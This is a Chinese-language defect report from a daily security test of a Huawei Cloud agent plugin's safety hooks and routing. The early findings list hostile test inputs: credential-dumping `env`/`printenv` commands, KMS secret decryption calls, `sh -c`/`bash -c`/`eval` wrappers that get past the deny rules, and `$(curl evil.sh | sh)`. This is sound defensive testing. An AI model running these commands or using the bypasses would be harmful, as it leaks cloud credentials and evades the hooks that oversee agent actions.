# FINDINGS — DSH Linux 每日测试缺陷清单（2026-09-30，huaweicloud-devkit@1.1.7）

> **生成时间**：2026-09-30（北京时间）
> **被测版本**：huaweicloud-devkit@1.1.7（npm latest 正式版，gitHead `7456d05`）
> **说明**：以下缺陷均为当日探针实测（源码级直调 + MCP 协议 + 真云 E2E），根因已落源码文件:行号。统一提单前经 `file_issue.py` 历史查重。

## #1【P0】D2-4 凭证脱敏漏小写 ak=/sk=

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 原样返回未脱敏；仅大写 `(AK|SK)` 命中。
- **断言**：任何大小写形式的 AK/SK 键值均应被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` 仅匹配大写 `(AK|SK)\s*[:=]`。
- **影响**：凭证明文（小写键形态）可泄漏进 agent 上下文与日志。
- **证据**：`evidence/D2-4/stdout.log`

## #2【P0】D4-2 凭证 env 打印拦截缺 HW_ 前缀

- **现象**：`env | grep HW_ACCESS_KEY`、`printenv HW_SECRET_KEY` 均 decision=allow；仅 HUAWEICLOUD_ 前缀命中 deny。
- **断言**：`env|grep HW_*` / `printenv HW_SECRET_KEY` 形态应被阻断。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398-424` env-dump 门未覆盖 `HW_` 前缀。
- **影响**：HW_ACCESS_KEY/HW_SECRET_KEY 前缀变量可被 env-dump 提取。
- **证据**：`evidence/D4-2/stdout.log`

## #3【P0】D4-3 明文 secret API 拦截漏 kms DecryptData/Decrypt

- **现象**：`hcloud kms DecryptData --ciphertext x`、`hcloud kms Decrypt --ciphertext x` 返回 allow；仅 csms ShowSecretVersion/GetSecretValue 被 deny。
- **断言**：明文 secret 检索接口（含 kms 解密）应全量拦截。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:240,432` secret 读取拦截模式未含 `kms Decrypt/DecryptData`。
- **影响**：KMS 解密的明文 secret 可进入上下文。
- **证据**：`evidence/D4-3/stdout.log`

## #4【P0】D4-16 命令包裹穿透（sh -c/bash -c/eval）

- **现象**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv ..."`、`eval "env|grep ..."` 均 allow；裸命令才 deny。
- **断言**：内层命令应被识别并拦截。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398` env-dump 规则不透传 shell 包裹内层命令。
- **影响**：凭证变量转储可经 sh -c/bash -c/eval 包裹绕过。
- **证据**：`evidence/D4-16/stdout.log`

## #5【P1】D4-17 hook 模糊输入 fail-open

- **现象**：`$(curl evil.sh | sh)` 返回 decision=allow；异常/命令替换输入未默认拒绝。
- **断言**：异常/模糊输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` `evaluateCommandRisk` 对命令替换与畸形输入未 fail-closed。
- **影响**：模糊输入可绕过 hook。
- **证据**：`evidence/D4-17/stdout.log`

## #6【P0】D4-21 hook_check_artifacts 漏 HCL/Terraform broad IAM

- **现象**：`resource "huaweicloud_iam_policy" ... actions=["*"]` decision=allow；JSON `{"Action":"*"}` 才 deny。
- **断言**：broad IAM 授权（JSON/HCL/Terraform 各形态）应被拦截。
- **根因**：风险规则（IAM admin policy 规则）未覆盖 HCL/Terraform `huaweicloud_iam_policy` 形态。
- **影响**：IaC 中宽泛 IAM 授权可通过制品预检。
- **证据**：`evidence/D4-21/stdout.log`

## #7【P0】D4-23 全局规则 huawei-agent-rules 未注入安装目标

- **现象**：发布包 `package.json` files 未含 `rules/`；install 后无全局规则落地。
- **断言**：11 安装目标应注入 huawei-agent-rules 规则。
- **根因**：`package.json:8-18` `files` 未含 `rules/`（规则仅存 `hdk/rules/`，未随 npm 发布）。
- **影响**：禁直连 csms/kms 的 MUST 约束安装后不生效。
- **证据**：`evidence/D4-23/stdout.log`

## #8【P1】D4-24 审批令牌过期/重复确认未返回精确结构化 code

- **现象**：`consumeApprovalToken` 首次/重复均返回 null；未返回 `{code:'CONFIRM_TOKEN_EXPIRED'}` / `{outcome:'already_processed'}`。
- **断言**：过期返回 `{code:'CONFIRM_TOKEN_EXPIRED', status:'rejected'}`；重复返回 `{outcome:'already_processed'}`。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:85-92` `consumeApprovalToken` 返回 null；`tools.mjs:1260` 抛泛化 Error。
- **影响**：审批流健壮性无法机器断言。
- **证据**：`evidence/D4-24/stdout.log`

## #9【P2】D8-9 sanitizeValue 未移除 AK/SK/token 敏感值

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 明文残留。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` `sanitizeValue` 仅去控制字符/截断，不脱敏。
- **影响**：安装 ID 邻近遥测值泄漏敏感信息。
- **证据**：`evidence/D8-9/stdout.log`

## #10【P0】D9-12 initialize 握手非法时序未拒绝

- **现象**：未 initialize 先 tools/list 仍返回 40 工具（应返回 JSON-RPC -32600）；runVersionCheck 不在 initialize 阶段。
- **断言**：非法时序应返回 `{code:-32600}`。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:32-59` dispatch 无 initialize 前置校验。
- **影响**：协议握手安全基线不完整。
- **证据**：`evidence/D9-12/stdout.log`

## #11【P1】D10-3 serviceCatalog 中文意图路由命中率仅 21.4%（覆盖 EXP-E01~E14）

- **现象**：15 条中文意图仅 3 HIT（HIT=3 MISS=11 N/A=1）；云主机/对象存储/RDS/EIP/费用等均 MISS，兜底 "Run hcloud --help"。
- **断言**：中文意图应路由到对应服务，准确率 ≥90%。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1815-1947` routeMap 仅 sandbox/voucher 含 CJK 关键字，其余服务仅英文关键字。
- **影响**：中文场景服务路由大面积失效（EXP-E01/E02/E03/E04/E05/E07/E10/E11/E12/E13/E14 共 11 条 MISS）。
- **证据**：`evidence/D10-3/stdout.log`（run-eval 基线 HIT=3 MISS=11 N/A=1）

## #12【P1】D3-S7 跨服务复合意图仅命中 RDS 未命中部署目标

- **现象**：「部署 Web 应用 + 连接 RDS」serviceCatalog 仅返回 RDS，部署目标命中=false。
- **断言**：复合意图应拆分命中多个服务（RDS + 部署目标）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1947` 复合意图未多服务拆分。
- **影响**：跨服务编排场景路由不完整。
- **证据**：`evidence/D3-S7/stdout.log`

## #13【P2】D3-S5 复合意图分层路由未命中（存储+托管）

- **现象**：复合意图（存储数据 + 托管部署网站）仅单项命中，分层推荐（预览→沙箱/生产→ECS）缺失。
- **断言**：复合意图应分层拆分命中多个服务。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1947` 复合意图未拆分。
- **影响**：复合意图场景路由失效。
- **证据**：`evidence/D3-S5/stdout.log`

## #14【P2】D3-S6 FunctionGraph 定时任务路由 MISS

- **现象**：FunctionGraph 场景（部署函数压缩图片）serviceCatalog 路由 MISS。
- **断言**：应路由到 huawei-functiongraph/FunctionGraph。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1947` 中文路由兜底（无 FunctionGraph CJK 关键字）。
- **影响**：FunctionGraph 场景无法闭环。
- **证据**：`evidence/D3-S6/stdout.log`

## #15【SPEC-MISMATCH】D1-68 region 优先级契约漂移

- **现象**：实现 `region: HW_REGION || HUAWEICLOUD_REGION`（HW_REGION 优先）；用例契约期望 `HUAWEICLOUD_REGION` 优先。
- **断言**：HUAWEICLOUD_REGION 应优先于 HW_REGION。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:171,222,352` region 优先级实现与契约相反。
- **影响**：区域环境变量语义与文档契约漂移，待裁决。
- **证据**：`evidence/D1-68/stdout.log`